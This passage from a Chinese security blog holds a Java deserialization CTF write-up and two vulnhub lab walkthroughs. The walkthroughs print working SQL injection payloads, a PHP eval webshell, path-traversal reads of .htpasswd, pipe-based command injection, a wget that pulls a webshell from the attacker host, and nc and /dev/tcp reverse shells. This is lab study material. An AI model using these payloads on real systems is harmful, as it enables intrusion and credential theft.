href="https://xilitter.github.io/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">babyurl</a>）更早是今年 AliyunCTF 爆出来的新链子。</p><p>本来是知道Springboot的依赖自带 jackson 的</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/4.png" class><p>固化思维以为 jackson 依赖只能打 Json 反序列化。</p><p>简单说一下链子的流程</p><p>出发点是jdk自带的 BadAttributeValueExpException 类，它的 readObject 方法可以调任意对象的toString，</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/5.png" class><p>接下来就要用到 jackson包里的类了——POJONode</p><p>它本身是没有定义 toString 方法的实现，然而追溯到两层继承类，BaseJsonNode</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/6.png" class><p>该类重写了 toString 方法。跟进到 writeValueAsString 方法</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/7.png" class><p>该方法实现了一种类似于Json序列化的操作，可以继续往下跟进看看，在babyurl那道题已经跟进过了。序列化的时候会调用任意 getter 方法。</p><p>而在CC链常用作执行类的 TemplatesImpl 就存在合适的getter方法</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/8.png" class><p>重点是这个方法会调用 newTransformer()，最终会走到类加载的那个地方。</p><p>实际上链子的流程大概就是这样，但是存在两个细节点需要处理</p><p>第一个就是 jackson 链子的不稳定问题，序列化的时候首先会获取javabean的属性然后调用它的getter方法</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/9.png" class><p>有时反序列化的时候会优先调用 getStylesheetDOM 方法，由于_dom的属性为null，导致异常链子中断。而且存在缓存，也就是说如果第一次反序列化失败，后面再执行多少次都一样，除非重启环境。因为执行getter方法的顺序不确定，所以也就存在一个不稳定的问题。</p><p>源码分析详见出题人另一篇文章：<a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">关于java反序列化中jackson链子不稳定问题</a></p><p>解决办法是用一个动态代理类——JdkDynamicAopProxy</p><p>它是Springboot 的内置类，Springboot框架有一个显著的特性就是AOP（面向切面编程），JdkDynamicAopProxy就是 Spring AOP 框架的一部分，用于实现切面编程。</p><p>让JdkDynamicAopProxy类对 TemplatesImpl 类进行封装或进行代理，设置指定接口，那么在调用getter的时候也会调用我们指定的方法。</p><p>重点看JdkDynamicAopProxy类的invoke方法</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/10.png" class><p>这三个参数分别为代理对象，方法，以及参数。在120行，对方法进行调用</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/11.png" class><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/12.png" class><p>而target是通过 targetSource 获取</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/13.png" class><p>targetSource 是通过本类的 advised 属性赋值</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/14.png" class><p>它是一个AdvisedSupport类型</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/15.png" class><p>所以要用这个类去封装我们的 TemplatesImpl 对象。</p><p>第二个问题就是序列化的时候会发生报错</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/16.png" class><p>报错点在这里</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/17.png" class><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/18.png" class><p>这个方法是Java序列化机制的一部分，它是在对象进行序列化时被调用的特殊方法。它的存在可以默认改变它的序列化行为，可能会偏离我们的预期结果。</p><p>所以可以通过字节码动态删除 writeReplace 这个方法</p><h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><p>题目中自己定义了一个Filter，限制了payload的长度，</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/19.png" class><p>发送的请求数据首先会被过滤器链处理，最后才会交给server，调试代码看看 getContentLength 是怎么获取的。</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/20.png" class><p>checkFacade 方法判断请求是否为null</p><p>一路跟进，实际上就与 contentLength 属性有关</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/21.png" class><p>查看调用，有对应的setter</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/22.png" class><p>继续忘上找，在 Http11Processor 类中</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/23.png" class><p>把长度设置为-1不就可以满足长度限制了，满足if条件顺利执行这个方法</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/24.png" class><p>contentLength 表示数据包的 Content-Length字段值，自然大于0，查看 contentDelimitation 属性的调用</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/25.png" class><p>数据报文的编码格式为 chunked，就设置为True，那么就可以用 chunked 编码绕过getContentLength</p><p>注意chunk编码的格式，尾部用大小为0的块标识</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/26.png" class><p>成功反序列化</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/27.png" class><h3 id="JNI绕过RASP"><a href="#JNI绕过RASP" class="headerlink" title="JNI绕过RASP"></a>JNI绕过RASP</h3><p>很离谱，复制代码在idea上起的环境能够写入内存马，用出题人的docker起的环境写不进去。看出题人的WP利用代码执行来目录遍历和读文件，不会整，留个坑。</p><p>该题目是开了RASP防护的，RASP 全称为 Run­time Ap­pli­ca­tion Self-Pro­tec­tion，实时程序自我保护。RASP  通常嵌入在程序内部，具备实时监控危险函数调用，并阻止该危险调用的功能。与传统 WAF 对比， RASP  实现更为底层，规则制定更为简单，攻击行为识别更为精准。</p><p>Java RASP 通常使用 java agent 技术实现，官方WP说可以读文件读到 RASP的jar包内容</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/28.png" class><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/29.png" class><p>ban掉了forkAndExec和loadLibrary0，java的一些执行类，比如ProcessBuilder，Runtime.exec底层会调用forkAndExec，本地加载动态链接库的方法，比如System.loadLibrary或者System.load底层会调用loadLibrary0</p><p>禁用掉这两个底层接口方法能够防御几乎所有的命令执行以及大部分绕过</p><p>WP说到可以利用反射来调用 <code>java.lang.ClassLoader.NativeLibrary</code> 中的 <code>load</code> 方法来加载恶意so文件执行命令</p><p>而NativeLibrary就是 JNI 的一个抽象类。JNI（Java Native Interface）是 Java 提供的一种机制，用于在 Java 程序中调用本地（Native）代码，即使用其他语言（如C、C++）编写的代码，从而可以充分利用本地代码的功能和性能优势，实现对底层系统资源和外部库的访问。</p><p>贴一张师傅的图解释JNI的机制</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/30.png" class><p>其实看到一些java的方法是Native修饰的，那它就是用底层C去实现的。</p><p>利用JNI去实现java程序去调用C程序的五个步骤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 定义一个native修饰的方法</span><br><span class="line">2. 使用javah进行编译 </span><br><span class="line">3. 编写对应的c语言代码</span><br><span class="line">4. 使用gcc编译成dll文件或者so文件</span><br><span class="line">5. 编写一个Java类使用System.loadLibrary方法，加载dll/so文件并且调用（本题用反射使用load方法）</span><br></pre></td></tr></table></figure><p>剩下的就是跟着WP做了</p><img src="/2023/10/25/DASCTF-X-CBCTF-2023-bypassjava-%E5%A4%8D%E7%8E%B0/31.png" class><p>贴个图，也算是复现过了。很奇怪，用burp发包写不进马，用python脚本模拟发包就可以。</p><h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h2><p>重点还是了解JNI机制与RASP的绕过原理，毕竟对于我来说是新东西，后续会进一步学习，其次就是写内存马的时候经常写不进去，还是不太熟练。最后就是复习了一下Jackson的原生反序列化，希望这次不会忘了。</p><p>参考链接：</p><p><a href="https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/#%E6%89%93%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%8B%BF%E5%88%B0flag">https://pankas.top/2023/10/22/dasctfxcbctf-2023-bypassjava-wp/#%E6%89%93%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%8B%BF%E5%88%B0flag</a></p><p><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E8%A7%A3%E5%86%B3%E9%9A%8F%E6%9C%BA%E6%80%A7%E9%97%AE%E9%A2%98">https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/#%E8%A7%A3%E5%86%B3%E9%9A%8F%E6%9C%BA%E6%80%A7%E9%97%AE%E9%A2%98</a></p><p><a href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP/#%E9%80%9A%E8%BF%87-jni-%E7%BB%95%E8%BF%87-rasp">https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP/#%E9%80%9A%E8%BF%87-jni-%E7%BB%95%E8%BF%87-rasp</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/14067160.html#0x02-jni%E5%AE%9E%E7%8E%B0">https://www.cnblogs.com/nice0e3/p/14067160.html#0x02-jni%E5%AE%9E%E7%8E%B0</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ctf </tag>
            
            <tag> RASP </tag>
            
            <tag> Jackson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackme2-DHCP 打靶记录</title>
      <link href="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-靶场环境"><a href="#0x01-靶场环境" class="headerlink" title="0x01 靶场环境"></a>0x01 靶场环境</h2><blockquote><p>局域网网段：192.168.111.0&#x2F;24</p><p>攻击机 kali：192.168.111.128&#x2F;24</p><p>目标机 hackme2-DHCP：192.168.111.131&#x2F;24</p></blockquote><h2 id="0x02-打靶目标"><a href="#0x02-打靶目标" class="headerlink" title="0x02 打靶目标"></a>0x02 打靶目标</h2><blockquote><p>拿到目标主机的ROOT权限</p></blockquote><h2 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03 信息收集"></a>0x03 信息收集</h2><p>nmap扫描到目标主机</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/1.png" class><p>接着扫描开放的端口以及服务</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/2.png" class><p>开放了web服务和远程SSH登录，打开web网站是一个简易的登录框</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/3.png" class><p>并且有注册功能，可以注册账号登录进去</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/4.png" class><p>登录进来后是一个查询的功能，测试了几次都没回显，扫描器扫一波目录文件</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/5.png" class><p>渗透前的信息收集到这</p><h2 id="0x04-Web渗透"><a href="#0x04-Web渗透" class="headerlink" title="0x04 Web渗透"></a>0x04 Web渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>这么多可能与数据库交互的地方，第一个猜测的就是可能会存在sql注入漏洞，打算在查找书名的地方入手</p><p>空白查询的时候会显示所有的书籍信息</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/6.png" class><p>当我输入书籍名称的时候也会出现该书籍的相关信息</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/7.png" class><p>起初我试了各种闭合符以及万能密码都显示不出信息，直到测试输入一个O</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/8.png" class><p>这就有意思了，类似于like的模糊查询，只要输入书籍名字的前一部分查询，都能回显信息</p><p>猜测后端的代码逻辑可能是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like&#x27; &quot;.$input.&quot; %&#x27;;</span><br></pre></td></tr></table></figure><p>这也能够合理解释为什么输入空白查询能显示出所有课本信息</p><p>针对此代码逻辑构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%&#x27; and &#x27;666&#x27; like &#x27;6</span><br></pre></td></tr></table></figure><p>拼接之后的代码逻辑类似于</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">book_table like &#x27;O%&#x27; and &#x27;666&#x27; like &#x27;6%&#x27;;</span><br><span class="line">查询书籍表中O开头的书籍以及字符串&quot;666&quot;中匹配6开头的字符串，中间用and连接，两边都为true，很明显是能查出数据的</span><br></pre></td></tr></table></figure><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/9.png" class><p>改payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%&#x27; and &#x27;666&#x27; like &#x27;5</span><br></pre></td></tr></table></figure><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/10.png" class><p>查不到数据了，payload验证成功</p><p>查数据库，看表结构应该有三个字段，有回显，用联合查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%&#x27;/**/union/**/select/**/database(),2,3/**/like&#x27;</span><br></pre></td></tr></table></figure><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/11.png" class><p>查数据表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%&#x27;/**/union/**/select/**/group_concat(table_name),2,3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&#x27;web</span><br></pre></td></tr></table></figure><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/12.png" class><p>注入user表的信息，得到管理员的账号密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%&#x27;/**/union/**/select/**/group_concat(user),group_concat(pasword),3/**/from/**/users/**/where/**/&#x27;1&#x27;/**/like/**/&#x27;</span><br></pre></td></tr></table></figure><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/13.png" class><p>有个superadmin，应该就是管理员账号了，密码好像是md5加密，john工具解不开</p><p>用在线md5爆破出密码</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/14.png" class><p>账号：superadmin 密码：Uncrackable</p><p>退出现有账户用管理员登录，有两个功能</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/15.png" class><p>文件上传和用户查询</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>试着上传木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/16.png" class><p>上传php，类似做了白名单的限制，上传图片也访问不了，因为uploads目录根本就不存在</p><p>上传点利用失败</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>下一个功能点是搜索框，简单测试了一下，存在XSS漏洞</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/17.png" class><p>不过对于我们拿shell没有帮助，当我们输入框都输入 2*2</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/18.png" class><p>在Last Name框中对输入做了运算，猜测后端可能用了eval函数做了处理</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/19.png" class><p>存在命令执行漏洞，反弹shell不成功，echo写木马也写不进去，wget远程下马也不行，好像是不出网</p><p>看源码吧，</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/20.png" class><p>做了黑名单，对上传的文件名做了限制，但是限制的不多，phtml后缀好像是可以绕过的</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/21.png" class><p>找到上传路径了，游览器访问也是存在的。那么思路就有了，继续文件上传</p><p>编写一个后缀为phtml的木马</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/22.png" class><p>木马上传成功，用蚁剑连接</p><p>蚁剑没有-e参数，常规nc反弹用不了，用bash反弹也不成功，虚拟终端使用如下命令反弹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.111.128 8080 &gt;/tmp/f</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为虚拟终端没有参数-e，常规的反弹shell用不了。那么就使用linux的无-e参数的反弹shell。mkfifo 命令首先创建了一个命令管道，nc与kali机建立socket连接，kali机上输入的命令将输入重定向到命令管道，cat /tmp/f查看该命令管道里的内容，并且作为/bin/sh的输入，交互式shell，执行kali机输入的命令，2&gt;&amp;1将标准输出和标准错误输出传递给nc，然后回显到我们的kali机上，形成一个回路。</span><br></pre></td></tr></table></figure><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/23.png" class><p>shell反弹成功</p><h3 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h3><p>查找具有s权限的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/24.png" class><p>貌似是一个二进制文件</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/25.png" class><p>试试运行一下</p><img src="/2023/10/18/hackme2-DHCP-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/26.png" class><p>获得ROOT权限，提权成功</p><p>打靶收获：锻炼了漏洞的综合利用能力</p>]]></content>
      
      
      <categories>
          
          <category> 打靶记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI-WEB-2.0打靶记录</title>
      <link href="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h2><blockquote><p>局域网网段：192.168.111.0&#x2F;24</p><p>攻击机 kali：192.168.111.128&#x2F;24</p><p>目标机 AI-WEB-2.0：192.168.111.130&#x2F;24</p></blockquote><h2 id="打靶目标"><a href="#打靶目标" class="headerlink" title="打靶目标"></a>打靶目标</h2><blockquote><p>获得靶机的ROOT权限，拿到唯一的flag</p></blockquote><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>因为是在同一网段，所以直接扫描存活主机，用nmap或者arp-scan都可以</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/1.png" class><p>其他两个IP为主机和kali机，所以目标机的ip为192.168.111.130,</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/2.png" class><p>端口开放了80和22端口，分别是web和ssh远程登录服务，那么就从web服务入手</p><p>游览器访问该网站的web服务，网站做的很简洁，就是一个登录注册的功能，而且也没有过多的js文件和有用的注释</p><p>随便注册一个，登录进去，然而登录进去之后就是一个静态页面，没有特定功能，有点难办啊</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/3.png" class><p>找不到什么有用的信息，那么就扫一下目录</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/4.png" class><p>唯一可能有用的东西就是download.php了，但是访问是空白页面</p><h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>在此之前做了一些尝试，比如登录页或者注册页可能会存在sql注入</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/5.png" class><p>但是实际上防御的非常严格，注册页的登录框过滤了字符，应该是找不到sql注入的点的，我甚至有点怀疑这个php的站后端是用json来储存用户数据的。</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>无奈，又去翻了翻源代码</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/6.png" class><p>唯一的注释让我有点在意，于是就去github上搜这个作者的名字，碰碰运气。看能不能找到源码，（虽然希望不大，但是也是一种思路）</p><p>也算是歪打正着，不过不是查到了源码</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/7.png" class><p>它的这个Filesharing项目中也有download.php，能够任意文件读取，那么猜想本站中的download.php文件中的参数是不是也是这个file_name，会不会页存在任意文件读取</p><p>结果试了试，假设成立</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/8.png" class><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/9.png" class><p>下一步就读取源码了，不过这里有个小坑，download.php文件的后端代码好像不处理相对路径，所以只能用绝对路径来下载本站的源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download.php?file_name=../../../../../../../../../var/www/html/index.php</span><br></pre></td></tr></table></figure><p>把源码都下载下来，分析一下代码</p><p>随意看看代码，果然不是用sql的，印证的我的猜想</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/10.png" class><p>注册的用户名就存储在这个文件中，看了一会，确定没有什么可以拿shell的地方</p><p>思绪又回到文件读取，仔细看网站，好像就是Filesharing项目，刚才怎么没仔细看，怪不得也是那个参数</p><p>其实刚扫目录的时候扫了一堆401</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/11.png" class><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当客户端向服务器发送请求时，服务器可能需要对客户端进行身份验证，以确保客户端有权访问所请求的资源。如果服务器收到一个未经授权的请求，它会返回HTTP 401状态码，提示客户端需要提供有效的凭据来访问所请求的资源</span><br></pre></td></tr></table></figure><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/12.png" class><p>看样子是使用账号密码认证</p><p>本站是一个apache服务器搭建的，apache通常会有一个认证文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache的认证文件用于实施基于HTTP认证的安全性措施，以确保只有经过授权的用户可以访问特定的资源、目录或网页。这种认证通常使用HTTP Basic Authentication或其他身份验证方法。</span><br></pre></td></tr></table></figure><p>利用这个文件读取漏洞来下载这个认证文件</p><p>网上查了查认证文件的路径，有三种常见的储存位置，在外部根目录之外的路径为 &#x2F;etc&#x2F;apache2&#x2F;.htpasswd</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/13.png" class><p>果然存储着账号密码，密码是hash加密了的，用john爆破一下</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/14.png" class><p>成功爆破出密码</p><p>访问 &#x2F;webadmin&#x2F;admin.php登录凭证</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/15.png" class><p>在robots.txt文件中有两个目录，访问第一个</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/16.png" class><p>是一个ping，根据做ctf的经验，肯定就是一个RCE了</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>先ping一下127.0.0.1测试功能是否完整</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/17.png" class><p>我既然能读源码了，就不用一个个试，看过滤了哪些字符，直接白盒审计</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/18.png" class><p>黑名单如上，使用 shell_exec 函数来执行ping命令</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/19.png" class><p>这个黑名单要仔细看，</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/20.png" class><p>将 | 和空格替换为空，有点坑啊，要眼神不好就发现不了，那么管道符就可以来绕过了</p><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/21.png" class><p>kali开启8787端口监听，反弹shell到我的kali机上</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.111.128/8787 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>很奇怪没反弹成功，都能ping了，不应该不出网的啊，那就写马吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|echo &quot;&lt;?php eval($_POST[1]);?&gt;&quot;&gt;1.php</span><br></pre></td></tr></table></figure><p>写是写上去了，但是执行命令没反应，下载文件看看</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/22.png" class><p>很离谱，过滤了关键字，(),$，那函数都写不进去了啊</p><p>再试试wget远程下马吧</p><p>kali机写一个马，用python开一个web服务</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/23.png" class><p>wget远程下载木马，payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1|wget http://192.168.111.128:8787/shell.php</span><br></pre></td></tr></table></figure><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/24.png" class><p>奈斯，接下来就用蚁剑连接吧</p><img src="/2023/10/18/AI-WEB-2-0%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/25.png" class><p>报红。。。猜测可能需要401认证，利用这个木马来反弹shell也没反应</p><p>继续收集信息，看一下上一级目录有什么文件</p><img 